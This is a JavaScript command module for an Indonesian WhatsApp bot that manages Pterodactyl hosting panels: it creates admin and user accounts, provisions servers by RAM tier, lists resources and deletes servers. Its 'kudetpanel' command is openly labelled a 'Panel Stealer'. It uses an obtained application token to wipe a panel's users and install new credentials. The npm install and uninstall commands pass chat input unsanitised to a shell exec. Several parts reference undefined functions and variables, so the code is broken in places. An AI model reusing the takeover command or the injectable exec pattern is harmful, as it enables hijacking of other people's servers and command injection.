// ALICE MULTI DEVICE, AIZAT, MADE IN INDONESIA
module.exports = {
  command: ['install-m', 'uninstall-m', 'kudetpanel', 'listapi', 'getapi', 'cadp', 'createadp', 'buatpanel', 'cpanel', '1gb', '2gb', '3gb', '4gb', '5gb', '6gb', '7gb', '8gb', '9gb', '10gb', 'unli', 'delpanel', 'listsrv', 'listusr'],
  operate: async (context) => {
    const { Alice, m, text, q, prefix, command, reply, xy, XReaction, isBan, Xban, isOwner, isPrem, XRP, isGroup, isBotAdmins, isAdmins, fs, axios, fetch, cheerio, crypto, db, moment, proto, generateWAMessageFromContent, prepareWAMessageMedia, getBuffer, fetchJson, ownername, botname, channel, pushname, alice, Styles } = context;

    switch (command) {
case 'install-m': {
   if (!isOwner) return reply("⚠️ Fitur ini khusus Owner!");
   if (!args[0]) return reply("⚠️ Masukkan nama module!\n\nContoh: .install-m axios");

   const moduleName = args[0];
   reply(`⏳ Sedang menginstall module *${moduleName}* ...`);

   const { exec } = require('child_process');
   exec(`npm install ${moduleName}`, (error, stdout, stderr) => {
      if (error) {
         reply(`❌ Gagal install module:\n${error.message}`);
         return;
      }
      if (stderr) {
         reply(`⚠️ Ada peringatan:\n${stderr}`);
      }
      reply(`✅ Module *${moduleName}* berhasil diinstall!\n\n${stdout}`);
   });
   break;
}

// uninstall module

case 'uninstall-m': {
   if (!isOwner) return reply("⚠️ Fitur ini khusus Owner!");
   if (!args[0]) return reply("⚠️ Masukkan nama module!\n\nContoh: .uninstall-m axios");

   const moduleName = args[0];
   reply(`⏳ Sedang menghapus module *${moduleName}* ...`);

   const { exec } = require('child_process');
   exec(`npm uninstall ${moduleName}`, (error, stdout, stderr) => {
      if (error) {
         reply(`❌ Gagal uninstall module:\n${error.message}`);
         return;
      }
      if (stderr) {
         reply(`⚠️ Ada peringatan:\n${stderr}`);
      }
      reply(`✅ Module *${moduleName}* berhasil dihapus!\n\n${stdout}`);
   });
   break;
}

case 'kudetpanel': {
    if (!isOwner) return XRO()
    generateRandomPassword()
    const permen = text.split('|').map(arg => arg.trim());
    const apiKey = permen[0];
    const panelUrl = permen[1];
    const userIdToKeep = permen[2];

    if (permen.length < 3) {
        reply(`*Kudeta Panel Ambil Token Plta Dulu Sama Lihat User ID Akun mu agar tidak ikut kehapus, Setelah Kudet Dimohon Kill SSH 42000 Detik = 12 Jam*\n\n\`\`\`Example Use: .pkudet plta|link|userid\`\`\``);
        return;
    }

    reply(`\`\`\`Processing...\`\`\`\n\`Target:\` ${panelUrl}\n\`Keep ID:\` ${userIdToKeep}\n\`Token:\` ${apiKey}\n\nIf The Stealer Finished Data Will Be Send To You`);

    try {
        const progress = await PermenReset(apiKey, panelUrl, userIdToKeep);
        reply(progress);
        const thumb = `${thumb}`;
        const resultn = `Panel Stealer Access By ${ownername}
        \`Target:\` ${panelUrl}
        \`Keep ID:\` ${userIdToKeep}
        
        \`New User:\` x
        \`Mail:\` x@reset.com
        \`Password:\` ${passwordaseli}`;
        Alice.sendMessage(m.sender, {
            contextInfo: {
                externalAdreply: {
                    showAdAttribution: true,
                    title: `Panel Has Been Stealed`,
                    body: `New Details`,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailUrl: thumbnailReply,
                    sourceUrl: yt
                }
            }, 
            text: resultn
        }, { quoted: m });
        
    } catch (error) {
        replh(error.message);
    }
}
break

case 'listapi': {
if (isBan) return XRB()
await XReaction()

    const axios = require('axios');
    const fs = require('fs');
    const dbPath = './AliceDatabase/fastapi-list.json';

    try {
        const { data } = await axios.get('https://fastrestapis.fasturl.cloud/api/endpoint');
        if (!data || !Array.isArray(data.result)) {
            return reply("❌ Gagal membaca format data. Tidak ditemukan array `result`.");
        }

        const endpoints = data.result;

        // 🔍 Auto-Kategori Berdasarkan Path
        const kategoriMap = {};
        for (const api of endpoints) {
            let kategori = api.endpoint.split('/')[1] || 'Lainnya';
            kategori = kategori.charAt(0).toUpperCase() + kategori.slice(1);
            if (!kategoriMap[kategori]) kategoriMap[kategori] = [];
            kategoriMap[kategori].push(api);
        }

        // 💾 Simpan dengan struktur: { AI: [...], Anime: [...], ... }
        fs.writeFileSync(dbPath, JSON.stringify(kategoriMap, null, 2));

        // 🧩 Buat tombol nativeFlow: 1 tombol per kategori
        const sections = [
            {
                title: '📁 Kategori Tersedia',
                rows: Object.entries(kategoriMap).map(([kategori, list]) => ({
                    header: `📦 ${kategori}`,
                    title: `${kategori} (${list.length} API)`,
                    id: `.getapi ${kategori}`
                }))
            }
        ];

        // 📄 Caption info saja, tidak ada list isi API di sini
        const totalApi = endpoints.length;
        const totalKategori = Object.keys(kategoriMap).length;
        const caption = `📚 *Daftar API berdasarkan Kategori*\n\nTerdapat *${totalApi}* API dari *${totalKategori}* kategori.\nKlik tombol di bawah untuk melihat daftar per kategori.\n\nGunakan *.getapi [nomor]* untuk melihat detail.`;

        const messageContent = {
            document: fs.readFileSync('./AliceMedia/image/Alice.png'),
            mimetype: "image/png",
            fileLength: 99999999999999,
            jpegThumbnail: fs.readFileSync('./AliceMedia/image/Alice.png'),
            fileName: `「 Alice Assistant 」`,
            caption,
            footer: packname,
            buttons: [
                {
                    buttonId: "action",
                    buttonText: { displayText: "📑 Pilih Kategori API" },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({
                            title: "Pilih Kategori API",
                            sections
                        })
                    }
                }
            ],
            contextInfo: {
                forwardingScore: 99999
            },
            viewOnce: true
        };

        await Alice.sendMessage(m.chat, messageContent, { quoted: m });

    } catch (err) {
        console.error("❌ Error in listapi:", err);
        return Alice.sendMessage(m.chat, { text: "⚠️ Terjadi kesalahan saat mengambil daftar API." });
    }
}
break

case 'getapi': {
if (isBan) return XRB()
await XReaction()

    const fs = require('fs');
    const path = './AliceDatabase/fastapi-list.json';
    const raw = await axios.get("https://fastrestapis.fasturl.cloud/api/endpoint");
    const apiData = raw.data.result;

    const index = parseInt(text);
    if (isNaN(index) || index < 1 || index > apiData.length) {
        return reply(`⚠️ Format: *.getapi [nomor]*\nContoh: *.getapi 5*`);
    }

    const api = apiData[index - 1];
    const url = `https://fastrestapis.fasturl.cloud${api.endpoint}`;

    return reply(
        `🔍 *Informasi Endpoint #${index}*\n\n` +
        `🌐 URL: ${url}\n` +
        `📦 Method: ${api.method}\n` +
        `🏷️ Tag: ${api.tags?.join(', ') || '-'}\n` +
        `📝 Summary: ${api.summary || '-'}\n` +
        `📖 Deskripsi:\n${api.description?.substring(0, 1000) || '-'}`
    );
}
break

case 'cadp':
case 'createadp': {
  try {
    if (!isOwner) return reply('❌ Fitur khusus Owner.')
    if (!args[0]) return reply(`Masukkan Username!\nContoh: ${prefix + command} xyroo [email-opsional]`)

    let username = args[0].toLowerCase()
    let email = (args[1] && args[1].includes('@')) ? args[1] : `${username}@gmail.com`
    let firstName = capital(username)
    let lastName = "Admin"
    let password = username + crypto.randomBytes(2).toString('hex')

    // Create ADMIN user (root_admin: true)
    let f = await fetch(domain + "/api/application/users", {
      method: "POST",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikeyplta
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: firstName,
        last_name: lastName,
        language: "en",
        password: password.toString(),
        root_admin: true
      })
    })

    let data = await f.json()
    if (data.errors) return reply("❌ Gagal membuat admin:\n" + JSON.stringify(data.errors[0], null, 2))

    let user = data.attributes
    let teks = `✅ Admin Panel Berhasil Dibuat

Role: Root Admin
User: ${user.username}
Email: ${user.email}
Password: ${password.toString()}
Login: ${global.domain || '—'}

Tips Keamanan:
• Segera login dan ganti password.
• Aktifkan 2FA di menu Security.
• Jangan bagikan kredensial ke siapapun.

© ${packname || 'Admin Panel'}`

    // Pesan interaktif
    let msgii = generateWAMessageFromContent(m.sender, { // ⬅ kirim langsung ke user (private chat)
      viewOnceMessage: { message: { 
        "messageContextInfo": { 
          "deviceListMetadata": {}, 
          "deviceListMetadataVersion": 2
        }, 
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: { 
            mentionedJid: [m.sender], 
            externalAdreply: { showAdAttribution: true }
          },
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          footer: proto.Message.InteractiveMessage.Footer.create({ text: packname }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"Login Admin Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
              },
              {
                "name": "cta_copy",
                "buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"copy_user\",\"copy_code\":\"${user.username}\"}`
              },
              {
                "name": "cta_copy",
                "buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"copy_pass\",\"copy_code\":\"${password.toString()}\"}`
              }
            ]
          })
        })
      }}
    }, { userJid: m.sender, quoted: null })

    // Kirim ke chat pribadi
    await Alice.relayMessage(msgii.key.remoteJid, msgii.message, { messageId: msgii.key.id })

    // Beri info singkat di grup biar jelas
    if (m.isGroup) {
      reply(`✅ Data Admin berhasil dibuat.\n👉 Detail dikirim ke private chat @${m.sender.split('@')[0]}`, { mentions: [m.sender] })
    }

  } catch (e) {
    console.error(e)
    reply('❌ Terjadi kesalahan saat membuat admin.\n' + (e?.message || e))
  }
}
break

case 'buatpanel':
case 'cpanel': {
    if (!isPrem) return XRP()
    if (!args[0]) return reply(`Masukkan Username\n\nContoh: .buatpanel username 6281234567890`)

    // username
    global.panel = [args[0].toLowerCase()]

    // nomor tujuan opsional
    global.nomorPanel = args[1] ? args[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : m.sender

    let teksnya = "Silahkan Pilih Ram Server Panel"
    let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
        "messageContextInfo": { 
            "deviceListMetadata": {}, 
            "deviceListMetadataVersion": 2
        }, 
        interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: { 
                mentionedJid: [m.sender], 
                externalAdreply: { showAdAttribution: true }
            }, 
            body: proto.Message.InteractiveMessage.Body.create({ 
                text: teksnya
            }), 
            footer: proto.Message.InteractiveMessage.Footer.create({ 
                text: packname
            }), 
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                buttons: [{
                    "name": "single_select",
                    "buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"⭐\", "rows": [
                        { "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".1gb ${args[0]}" }, 
                        { "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".2gb ${args[0]}" }, 
                        { "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".3gb ${args[0]}" }, 
                        { "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".4gb ${args[0]}" }, 
                        { "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".5gb ${args[0]}" }, 
                        { "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".6gb ${args[0]}" }, 
                        { "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".7gb ${args[0]}" }, 
                        { "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".8gb ${args[0]}" }, 
                        { "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".9gb ${args[0]}" },
                        { "header": "Ram 10GB", "title": "Ram 10GB | CPU 250%", "id": ".10gb ${args[0]}" }, 
                        { "header": "Ram Unlimited", "title": "Ram Unlimited | CPU 0%", "id": ".unli ${args[0]}" }
                    ]}]}`
                }]
            })
        })
    } }}, {userJid: m.sender, quoted: null}) 
    await Alice.relayMessage(msgii.key.remoteJid, msgii.message, { 
        messageId: msgii.key.id 
    })
}
break

case '1gb':
case '2gb':
case '3gb':
case '4gb':
case '5gb':
case '6gb':
case '7gb':
case '8gb':
case '9gb':
case '10gb':
case 'unli': {
    if (!isPrem) return XRP()
    if (global.panel == null) return reply('Nama/Username Tidak Ditemukan')
    
    var ram, disknya, cpu
    if (command == "1gb") { ram = "1000"; disknya = "1000"; cpu = "40" }
    else if (command == "2gb") { ram = "2000"; disknya = "1000"; cpu = "60" }
    else if (command == "3gb") { ram = "3000"; disknya = "2000"; cpu = "80" }
    else if (command == "4gb") { ram = "4000"; disknya = "2000"; cpu = "100" }
    else if (command == "5gb") { ram = "5000"; disknya = "3000"; cpu = "120" }
    else if (command == "6gb") { ram = "6000"; disknya = "3000"; cpu = "140" }
    else if (command == "7gb") { ram = "7000"; disknya = "4000"; cpu = "160" }
    else if (command == "8gb") { ram = "8000"; disknya = "4000"; cpu = "180" }
    else if (command == "9gb") { ram = "9000"; disknya = "5000"; cpu = "200" }
    else if (command == "10gb") { ram = "10000"; disknya = "5000"; cpu = "220" }
    else { ram = "0"; disknya = "0"; cpu = "0" }

    let username = global.panel[0].toLowerCase()
    let email = username + "@gmail.com"
    let name = capital(username) + " Server"
    let password = username + crypto.randomBytes(2).toString('hex')

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyplta
        },
        "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Server",
            "language": "en",
            "password": password.toString()
        })
    })
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
    let user = data.attributes

    let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyplta
        }
    })
    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup

    let f2 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyplta,
        },
        "body": JSON.stringify({
            "name": name,
            "description": packname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": ram,
                "swap": 0,
                "disk": disknya,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let result = await f2.json()
    if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
    
    let teks = `✅ Succes Create Panel

📌 *Data Akun Panel Kamu:*
👤 User     : ${user.username}
🔑 Password : ${password.toString()}
🌐 Login    : ${global.domain}

━━━━━━━━━━━━━━━━━━━━━━
📖 *Keterangan & Pengajaran:*
1. Simpan baik-baik data akun di atas (User & Password). 
   ➝ Admin hanya mengirim 1 kali saja, jika hilang server tidak bisa dikembalikan.
2. Gunakan panel untuk belajar & mengelola project kamu. 
   ➝ Jangan biarkan server idle atau tidak dipakai.
3. Panel ini bergaransi 15 hari. 
   ➝ Jika ada kendala, sertakan bukti transaksi/transfer saat klaim garansi.
4. Panel yang sudah *lama OFF / tidak digunakan* akan *otomatis dihapus*.
   ➝ Jadi *gunakan servermu secara aktif* agar tidak dianggap tidak terpakai.
5. Dilarang menggunakan panel untuk aktivitas ilegal/terlarang. 
   ➝ Jika terdeteksi, server akan langsung dihapus tanpa peringatan.

━━━━━━━━━━━━━━━━━━━━━━
📝 *Catatan Penting:*
- Gunakan panel sebaik mungkin untuk belajar, project, atau testing.
- Jangan share akun panel ke orang lain sembarangan.
- Jika butuh upgrade RAM/CPU, hubungi admin.
- Jangan bales chat ini, untuk menghindari banned !!

━━━━━━━━━━━━━━━━━━━━━━
✅ Terima kasih sudah order di *Aizat Panel Services*.
© Aizat
`

    let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
        "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 }, 
        interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: { mentionedJid: [m.sender], externalAdreply: { showAdAttribution: true }}, 
            body: proto.Message.InteractiveMessage.Body.create({ text: teks }), 
            footer: proto.Message.InteractiveMessage.Footer.create({ text: packname }), 
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                buttons: [
                    { "name": "cta_url", "buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`}, 
                    { "name": "cta_copy", "buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`},
                    { "name": "cta_copy", "buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`}
                ]
            })
        })
    } }}, {userJid: m.sender, quoted: null})

    // kirim ke nomor tujuan (opsional)
    await Alice.relayMessage(global.nomorPanel, msgii.message, { messageId: msgii.key.id })

    // info ke chat asal
    await reply(`*Berhasil membuat panel ✅*\nData akun sudah dikirim ke nomor: wa.me/${global.nomorPanel.split('@')[0]}`)

    global.panel = null
    global.nomorPanel = null
}
break

case 'delpanel': {
    if (!isPrem) return XRP()
    if (!text) return reply("id server")

    let f = await fetch(domain + "/api/application/servers?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyplta
        }
    })
    let result = await f.json()
    let servers = result.data
    let sections, nameSrv

    for (let server of servers) {
        let s = server.attributes
        if (Number(text) == s.id) {
            sections = s.name.toLowerCase()
            nameSrv = s.name
            let f = await fetch(domain + `/api/application/servers/${s.id}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyplta,
                }
            })
        }
    }

    let cek = await fetch(domain + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyplta
        }
    })
    let res2 = await cek.json();
    let users = res2.data;

    for (let user of users) {
        let u = user.attributes
        if (u.first_name.toLowerCase() == sections) {
            await fetch(domain + `/api/application/users/${u.id}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyplta
                }
            })
        }
    }

    if (sections == undefined) return reply("Server panel tidak ditemukan!")
    reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case 'listsrv': {
    if (!isOwner) return reply('❌ Fitur khusus Owner.')
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyplta
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Alice.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${alice}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }        
}
break;

case 'listusr': {
    if (!isOwner) return reply('❌ Fitur khusus Owner.')
  
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyplta
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Alice.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
//📈————————————————————————— [ © Aizat ] —————————————————————————📉\\
//————————————————————————//
// Panel Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\



//📈————————————————————————— [ © Aizat ] —————————————————————————📉\\
//————————————————————————//
// Premium Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
    }
  }
};
